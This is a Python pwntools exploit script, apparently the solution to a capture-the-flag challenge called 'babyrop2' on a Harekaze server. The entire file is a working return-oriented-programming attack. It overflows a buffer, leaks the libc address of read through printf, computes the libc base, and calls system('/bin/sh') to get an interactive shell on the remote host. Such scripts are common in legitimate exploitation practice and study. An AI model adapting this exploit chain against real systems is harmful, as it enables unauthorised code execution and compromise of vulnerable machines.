#!/usr/bin/env python
from pwn import *

if len(sys.argv) == 1:
    s = process('./babyrop2')
else:
    s = remote('problem.harekaze.com', 20005)

elf = ELF('./babyrop2')
libc = ELF('./libc.so.6')

pop_rdi = 0x400733
pop_rsi_r15 = 0x400731
read = 0x400695

buf_addr = elf.bss(0x500)

payload = ''
payload += 'A' * 0x20
payload += p64(buf_addr - 8)
payload += p64(pop_rdi) + p64(elf.got['read'])
payload += p64(elf.plt['printf'])
payload += p64(pop_rsi_r15) + p64(buf_addr) + p64(0)
payload += p64(read)
s.sendlineafter("What's your name? ", payload)

s.recvline()
libc_base = u64(s.recv(6).ljust(8, '\0')) - libc.symbols['read']
log.info('libc base: %#x' % libc_base)

payload2 = ''
payload2 += p64(pop_rdi) + p64(buf_addr + 0x18)
payload2 += p64(libc_base + libc.symbols['system'])
payload2 += '/bin/sh\0'
s.send(payload2)

s.interactive()
